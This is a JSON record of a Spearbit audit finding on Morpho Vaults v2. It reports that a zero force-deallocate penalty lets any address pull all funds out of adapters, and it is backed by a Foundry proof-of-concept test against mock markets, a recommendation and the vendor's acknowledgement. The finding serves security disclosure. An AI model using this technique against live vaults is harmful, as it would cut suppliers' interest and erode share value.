{
    "id": 62920,
    "kind": "PDF",
    "auditfirm_id": 6,
    "impact": "MEDIUM",
    "finders_count": 4,
    "protocol_id": 3462,
    "title": "forceDeallocatePenalty should not be set to 0 to avoid anyone to deallocate all the funds from the",
    "content": "## Adapters\n\n**Severity:** Medium Risk  \n**Context:** VaultV2.sol#L90  \n**Description:** When `mapping(address adapter => uint256) public forceDeallocatePenalty;` is set to zero for an adapter, the `forceDeallocate` functions won't increase the `penaltyAssets` number of shares that the `onBehalf` have to pay for the deallocate operation. This means that anyone (even if they have no position in the vault or have no allowance from `onBehalf`) can deallocate any amount of funds from any adapters.\n\n1. The adapters will stop earning \"real\" interest from the MetaMorpho Vaults or Morpho Blue markets. As a consequence, the suppliers will also stop earning.\n2. If the VIC interest per second is updated to 0 (given that no interest is generated), existing suppliers will start to lose share's value given that the `accrueInterest()` won't increase the `_totalAssets` (no interest) but will increase the number of shares minted to the Vault's managers (that don't rely on the VICs interest).\n\n## Proof of Concept\n\n```solidity\n// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity ^0.8.0;\n\nimport \"./BaseTest.sol\";\nimport { MorphoBlueAdapter } from \"../src/adapters/MorphoBlueAdapter.sol\";\nimport { MorphoBlueAdapterFactory } from \"../src/adapters/MorphoBlueAdapterFactory.sol\";\nimport { OracleMock } from \"../lib/morpho-blue/src/mocks/OracleMock.sol\";\nimport { IrmMock } from \"../lib/morpho-blue/src/mocks/IrmMock.sol\";\nimport { IMorpho, MarketParams, Id, Market, Position } from \"../lib/morpho-blue/src/interfaces/IMorpho.sol\";\nimport { MorphoBalancesLib } from \"../lib/morpho-blue/src/libraries/periphery/MorphoBalancesLib.sol\";\nimport { MarketParamsLib } from \"../lib/morpho-blue/src/libraries/MarketParamsLib.sol\";\nimport { IMorphoBlueAdapter } from \"../src/adapters/interfaces/IMorphoBlueAdapter.sol\";\nimport { IMorphoBlueAdapterFactory } from \"../src/adapters/interfaces/IMorphoBlueAdapterFactory.sol\";\n\ncontract SMBLossTest is BaseTest {\n    using MorphoBalancesLib for IMorpho;\n    using MarketParamsLib for MarketParams;\n\n    // Morpho Blue\n    address morphoOwner;\n    MarketParams internal marketParams_1;\n    MarketParams internal marketParams_2;\n    Id internal marketId_1;\n    Id internal marketId_2;\n    IMorpho internal morpho;\n    OracleMock internal oracle;\n    IrmMock internal irm;\n    ERC20Mock internal collateralToken_1;\n    ERC20Mock internal collateralToken_2;\n    ERC20Mock internal loanToken; // this is the V2 underlying\n    bytes[] internal expectedIds_1;\n    bytes[] internal expectedIds_2;\n    MorphoBlueAdapterFactory internal factoryMB;\n    MorphoBlueAdapter internal adapterMB;\n\n    function setUp() public override {\n        super.setUp();\n    }\n\n    function testFullPermissionlessDeallocate() public {\n        // setup Morpho Blue Market\n        _setupMB(underlyingToken);\n        // setup Vault v2\n        _setupVV2(10_000e18, 1e18);\n        address alice = makeAddr(\"alice\");\n        address bob = makeAddr(\"bob\");\n        // alice deposit 100 DAI\n        _deposit(alice, 100e18);\n        // enable the second MB market\n        vm.prank(allocator);\n        vault.setLiquidityData(abi.encode(marketParams_2));\n        // bob deposit to the second market 100 DAI\n        _deposit(bob, 100e18);\n        // set penalty to 2%\n        vm.prank(curator);\n        vault.submit(abi.encodeCall(IVaultV2.setForceDeallocatePenalty, (address(adapterMB), 0.02e18)));\n        vm.warp(vm.getBlockTimestamp() + 14 days);\n        vault.setForceDeallocatePenalty(address(adapterMB), 0.02e18);\n        address[] memory adapters = new address[](1);\n        bytes[] memory marketData = new bytes[](1);\n        uint256[] memory amounts = new uint256[](1);\n        adapters[0] = address(adapterMB);\n        marketData[0] = abi.encode(marketParams_1);\n        amounts[0] = 1e18;\n\n        // Carl has NEVER deposited to the Vault and has NO ALLOWANCE from anyone\n        address carl = makeAddr(\"carl\");\n        // tries to call the force deallocate but it will fail\n        // here fails because he owns no shares\n        vm.prank(carl);\n        vm.expectRevert(); // [FAIL: panic: arithmetic underflow or overflow (0x11)]\n        vault.forceDeallocate(adapters, marketData, amounts, carl);\n        // here fails because he has no allowance from BOB\n        vm.prank(carl);\n        vm.expectRevert(); // [FAIL: panic: arithmetic underflow or overflow (0x11)]\n        vault.forceDeallocate(adapters, marketData, amounts, bob);\n        // but if there's no penalty he will be able to deallocate from any market\n        // reducing the possible suppliers interest accrual + rewards\n        // set penalty to 0%\n        vm.prank(curator);\n        vault.submit(abi.encodeCall(IVaultV2.setForceDeallocatePenalty, (address(adapterMB), 0)));\n        vm.warp(vm.getBlockTimestamp() + 14 days);\n        vault.setForceDeallocatePenalty(address(adapterMB), 0);\n        vm.prank(carl);\n        amounts[0] = 100e18;\n        vault.forceDeallocate(adapters, marketData, amounts, bob);\n        vm.prank(carl);\n        marketData[0] = abi.encode(marketParams_2);\n        vault.forceDeallocate(adapters, marketData, amounts, bob);\n        // all the assets have been deallocated from the Morpho markets\n        assertEq(morpho.market(marketId_1).totalSupplyAssets, 0);\n        assertEq(morpho.market(marketId_2).totalSupplyAssets, 0);\n    }\n\n    function _deposit(address user, uint256 amount) internal {\n        deal(address(underlyingToken), user, amount, true);\n        vm.prank(user);\n        underlyingToken.approve(address(vault), type(uint256).max);\n        // supply\n        vm.prank(user);\n        vault.deposit(amount, user);\n    }\n\n    function _withdraw(address user, uint256 amount) internal {\n        vm.prank(user);\n        vault.withdraw(amount, user, user);\n    }\n\n    function _setupVV2(uint256 absoluteCap, uint256 relativeCap) internal {\n        // setup the MB adapter\n        vm.startPrank(curator);\n        vault.submit(abi.encodeCall(IVaultV2.setIsAdapter, (address(adapterMB), true)));\n        vm.stopPrank();\n        vm.warp(vm.getBlockTimestamp() + 14 days);\n        vault.setIsAdapter(address(adapterMB), true);\n        // setup the MB adapter as the main adapter\n        vm.prank(allocator);\n        vault.setLiquidityAdapter(address(adapterMB));\n        vm.prank(allocator);\n        vault.setLiquidityData(abi.encode(marketParams_1));\n        _increaseCaps(expectedIds_1, absoluteCap, relativeCap);\n        _increaseCaps(expectedIds_2, absoluteCap, relativeCap);\n    }\n\n    function _increaseCaps(bytes[] memory expectedIds, uint256 absoluteCap, uint256 relativeCap) internal {\n        // setup the absolute caps and relative caps\n        vm.startPrank(curator);\n        for (uint256 i = 0; i < expectedIds.length; i++) {\n            vault.submit(abi.encodeCall(IVaultV2.increaseAbsoluteCap, (expectedIds[i], absoluteCap)));\n            vault.submit(abi.encodeCall(IVaultV2.increaseRelativeCap, (expectedIds[i], relativeCap)));\n        }\n        vm.stopPrank();\n        vm.warp(vm.getBlockTimestamp() + 14 days);\n        for (uint256 i = 0; i < expectedIds.length; i++) {\n            vault.increaseAbsoluteCap(expectedIds[i], absoluteCap);\n            vault.increaseRelativeCap(expectedIds[i], relativeCap);\n        }\n    }\n\n    function _decreaseCaps(bytes[] memory expectedIds, uint256 absoluteCap, uint256 relativeCap) internal {\n        // setup the absolute caps and relative caps\n        vm.startPrank(curator);\n        for (uint256 i = 0; i < expectedIds.length; i++) {\n            vault.decreaseAbsoluteCap(expectedIds[i], absoluteCap);\n            vault.decreaseAbsoluteCap(expectedIds[i], relativeCap);\n        }\n        vm.stopPrank();\n    }\n\n    function _setupMB(ERC20Mock v2Underlying) internal {\n        morphoOwner = makeAddr(\"MorphoOwner\");\n        morpho = IMorpho(deployCode(\"Morpho.sol\", abi.encode(morphoOwner)));\n        loanToken = v2Underlying;\n        collateralToken_1 = new ERC20Mock();\n        collateralToken_2 = new ERC20Mock();\n        oracle = new OracleMock();\n        irm = new IrmMock();\n        marketParams_1 = MarketParams({\n            loanToken: address(loanToken),\n            collateralToken: address(collateralToken_1),\n            irm: address(irm),\n            oracle: address(oracle),\n            lltv: 0.8 ether\n        });\n        marketParams_2 = MarketParams({\n            loanToken: address(loanToken),\n            collateralToken: address(collateralToken_2),\n            irm: address(irm),\n            oracle: address(oracle),\n            lltv: 0.8 ether\n        });\n        vm.startPrank(morphoOwner);\n        morpho.enableIrm(address(irm));\n        morpho.enableLltv(0.8 ether);\n        vm.stopPrank();\n        morpho.createMarket(marketParams_1);\n        morpho.createMarket(marketParams_2);\n        marketId_1 = marketParams_1.id();\n        marketId_2 = marketParams_2.id();\n        factoryMB = new MorphoBlueAdapterFactory(address(morpho));\n        adapterMB = MorphoBlueAdapter(factoryMB.createMorphoBlueAdapter(address(vault)));\n        expectedIds_1 = new bytes[](3);\n        expectedIds_1[0] = abi.encode(\"adapter\", address(adapterMB));\n        expectedIds_1[1] = abi.encode(\"collateralToken\", marketParams_1.collateralToken);\n        expectedIds_1[2] = abi.encode(\"collateralToken/oracle/lltv\", marketParams_1.collateralToken, marketParams_1.oracle, marketParams_1.lltv);\n        expectedIds_2 = new bytes[](3);\n        expectedIds_2[0] = abi.encode(\"adapter\", address(adapterMB));\n        expectedIds_2[1] = abi.encode(\"collateralToken\", marketParams_2.collateralToken);\n        expectedIds_2[2] = abi.encode(\"collateralToken/oracle/lltv\", marketParams_2.collateralToken, marketParams_2.oracle, marketParams_2.lltv);\n    }\n\n    // copied from original MorphoBlueAdapter Test\n    function _overrideMarketTotalSupplyAssets(Id marketId, int256 change) internal {\n        bytes32 marketSlot0 = keccak256(abi.encode(marketId, 3)); // 3 is the slot of the market\n        bytes32 currentSlot0Value = vm.load(address(morpho), marketSlot0);\n        uint256 currentTotalSupplyShares = uint256(currentSlot0Value) >> 128;\n        uint256 currentTotalSupplyAssets = uint256(currentSlot0Value) & type(uint256).max;\n        bytes32 newSlot0Value = bytes32((currentTotalSupplyShares << 128) | uint256(int256(currentTotalSupplyAssets) + change));\n        vm.store(address(morpho), marketSlot0, newSlot0Value);\n    }\n}\n```\n\n**Recommendation:** Morpho should avoid setting the `forceDeallocatePenalty` of a vault to zero to avoid the above side effects and unexpected behavior. If setting the `forceDeallocatePenalty` to zero for an adapter is a way to allow anyone to \"ping\" the adapters (to account for possible losses), the `forceDeallocate` function should be refactored and the \"ping\" feature should be implemented in a separate ad-hoc function without the ability to deallocate any funds.\n\n**Morpho:** Acknowledged. We don't think that this should be fixed. It's the role of the curator to make sure that the setup makes sense (and of users to check that as well). It's also unclear how we would enforce anything here. Note that the comment added in PR 397 which fixes the finding \"The scope and role of the force deallocations penalties should be better explained\" helps highlight the importance of this parameter.\n\n**Spearbit:** Morpho has acknowledged the issue.",
    "summary": "",
    "report_date": "2025-10-13T00:00:00.000Z",
    "contest_prize_txt": "",
    "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Vaults-v2-Spearbit-Security-Review-May-2025.pdf",
    "sponsor_name": null,
    "sponsor_link": "",
    "quality_score": 0,
    "general_score": 0,
    "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Vaults-v2-Spearbit-Security-Review-May-2025.pdf",
    "github_link": "",
    "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/Morpho-Vaults-v2-Spearbit-Security-Review-May-2025.pdf",
    "pdf_page_from": 12,
    "contest_id": "",
    "slug": "forcedeallocatepenalty-should-not-be-set-to-0-to-avoid-anyone-to-deallocate-all-the-funds-from-the-spearbit-none-morpho-vaults-v2-pdf",
    "firm_name": "Spearbit",
    "firm_logo_square": "spearbit_square.png",
    "protocol_name": "Morpho Vaults v2",
    "bookmarked": false,
    "read": false,
    "issues_issue_finders": [
        {
            "wardens_warden": {
                "handle": "Saw-mon and Natalie"
            }
        },
        {
            "wardens_warden": {
                "handle": "Om Parikh"
            }
        },
        {
            "wardens_warden": {
                "handle": "Jonatas Martins"
            }
        },
        {
            "wardens_warden": {
                "handle": "Emmanuele Ricci"
            }
        }
    ],
    "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
    },
    "protocols_protocol": {
        "name": "Morpho Vaults v2",
        "protocols_protocolcategoryscore": []
    },
    "issues_issuetagscore": []
}